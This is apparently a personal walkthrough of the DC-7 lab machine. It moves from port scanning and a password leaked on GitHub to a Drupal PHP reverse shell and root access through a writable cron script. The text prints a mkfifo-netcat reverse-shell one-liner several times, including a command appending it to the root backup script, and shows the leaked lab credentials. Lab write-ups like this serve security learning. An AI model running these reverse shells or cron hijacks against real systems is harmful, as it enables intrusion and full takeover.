## Step 1: The Basics

```bash
nmap -p- -sC -sV -T5 dc-7

22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6  
80/tcp open  http    Apache httpd 2.4.25 (Debian)  
|_http-generator: Drupal 8 (https://www.drupal.org)

```

SSH and a Drupal 8 install. Nothing else exposed.

## Step 2: Automated Enumeration Comes Up Empty

```bash

droopescan scan drupal -u http://dc-7
```

Droopescan confirmed Drupal 8.7.x but found no plugins and nothing exploitable. A directory fuzz didn’t add much either:

```bash 
wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hc 404 "http://dc-7/FUZZ"
```


Two automated tools, two dead ends. Time to slow down and read the site itself, which included a small nudge: “Think outside the box.”
and when i was discovering the webpage i found @DC7USER at the bottom of the page and then i googled it and found a GitHub page and inside that there was a `staffdb` repo and inside that there was a ==config.php== which save the Database Credentials normally.in there i found the password for dc7

![[Pasted image 20260922222141.png]]

## Step 3: A Username Is All It Takes

Manually browsing the site turned up a handle, @DC7USER. On a hunch, I searched for it directly. The very first result was a public GitHub repository, and sitting inside a config.php file was a set of hardcoded credentials:

$username = "dc7user";  
$password = "MdR3xOgB7#dW";

Not a CVE. Not a plugin bug. Just a developer who committed a config file with real credentials in it to a public repo.

## Step 4: In Through SSH

Those credentials didn’t work on the Drupal login form in web, but SSH was open, so I tried there instead.

ssh dc7user@dc-7

Straight in.
and it displayed a msg i have a mail 

![[Pasted image 20261001112959.png]]

```

```

## Step 5: A Mailbox Points at a Cron Job

Logging in flagged new mail

From root@dc-7 Fri Aug 30 03:15:17 2019
Return-path: <root@dc-7>
Envelope-to: root@dc-7
Delivery-date: Fri, 30 Aug 2019 03:15:17 +1000
Received: from root by dc-7 with local (Exim 4.89)
        (envelope-from <root@dc-7>)
        id 1i3O0y-0000Ed-To
        for root@dc-7; Fri, 30 Aug 2019 03:15:17 +1000
From: root@dc-7 (Cron Daemon)
To: root@dc-7
Subject:==Cron== <root@dc-7> ==/opt/scripts/backups.sh==
MIME-Version: 1.0
Content-Type: text/plain; charset=UTF-8
Content-Transfer-Encoding: 8bit
X-Cron-Env: <PATH=/bin:/usr/bin:/usr/local/bin:/sbin:/usr/sbin>
X-Cron-Env: <SHELL=/bin/sh>
X-Cron-Env: <HOME=/root>
X-Cron-Env: <LOGNAME=root>
Message-Id: <E1i3O0y-0000Ed-To@dc-7>
Date: Fri, 30 Aug 2019 03:15:17 +1000

and browsing a path referenced elsewhere on the box surfaced another pointer toward /var/mail/dc7user. Reading it led to a script, /opt/scripts/backups.sh, tied to a scheduled cron job.


dc7user@dc-7:~$ cat /opt/scripts/backups.sh
#!/bin/bash
rm /home/dc7user/backups/*
cd /var/www/html/
==drush sql-dump --result-file=/home/dc7user/backups/website.sql==
cd ..
tar -czf /home/dc7user/backups/website.tar.gz html/
gpg --pinentry-mode loopback --passphrase PickYourOwnPassword --symmetric /home/dc7user/backups/website.sql
gpg --pinentry-mode loopback --passphrase PickYourOwnPassword --symmetric /home/dc7user/backups/website.tar.gz
==chown dc7user:dc7user /home/dc7user/backups/*==
rm /home/dc7user/backups/website.sql
rm /home/dc7user/backups/website.tar.gz
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.56.119 8888 >/tmp/f
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.56.119 8888 >/tmp/f
You have new mail in /var/mail/dc7user


## Step 6: Drush, Drupal’s Backdoor Into Itself

The script used drush, Drupal’s command line administration tool. Drush can do far more than backups, including resetting user passwords directly, without needing to know the existing one.

```bash
cd /var/www/html   (web user)
drush user-password admin --password="admin"
```

Running it outside a real Drupal directory failed, but from inside the site root it worked immediately. The Drupal admin password was now whatever I wanted it to be.

then we look at the permissions of the `backup.sh file` and it can only be edited by `www-data` and `root` so next we try to escalate to `www-data`

```bash

dc7user@dc-7:~$ cd /opt/scripts | ls -lah
drwxr-xr-x 2 dc7user dc7user 4.0K Sep 23 03:15 backups

```

so normally cron jobs are ran by root user,and cron jobs are sm scheduled background processes normally execute every 15 min a=or any other scheduled time.so now we try to include a reverse shell code to the cron job and when the cron job execute i get a reverse shell.for that i was looking around the web page.
## Step 7: Getting Code Execution Through the CMS

Logging into the Drupal dashboard as admin gave full control, including the ability to add content. Drupal does not execute PHP embedded in content by default(because this a old version they dont detect php codes so we had to add that extention), so before anything else, I needed to enable a module that allows it.

https://www.drupal.org/project/php/releases/8.x-1.0

After installing and enabling the PHP module, I  found a  php-reverse-shell.php payload (a linux built in reverse shell), and started a listener before saving:
to find the reverse shell i typed below command in kali
`locate reverse-shell` and it output contained ==/usr/share/laudanum/php/php-reverse-shell.php ==
this famous and better reverse shell so i edited the code changing my ip and the port and started a listener

`nc -lvnp 3333

Viewing the page executed the payload as PHP this time instead of rendering it as plain text, and the listener caught a shell.

## Step 8: Stabilizing

`python -c 'import pty; pty.spawn("/bin/bash")'

## Step 9: Turning a Root Cron Job Against Itself

so now we are ==www-data== and now we can  write ==backup.sh== and now i write another reverse shell to the ==backup.sh  , and when this backup.sh run as the root(cron job runn ) we get the reverse shell and we are root now 

This is wb here the mail hint from earlier paid off. The backup script ran as root on a schedule, and I already had enough access to edit it. Rather than looking for a separate escalation path, I simply appended a reverse shell to the script itself:

`echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.56.1 8888 >/tmp/f" >> /opt/scripts/backups.sh`


![[Pasted image 20260926182424.png]]

Then set up a second listener and waited. When the cron job ran on its next scheduled cycle, it executed the added payload with full root privileges, and the shell connected back.

## Step 10: The Final Flag

whoami

cd /root  
cat theflag.txt

![[WhatsApp Image 2026-09-22 at 23.15.35.jpeg]]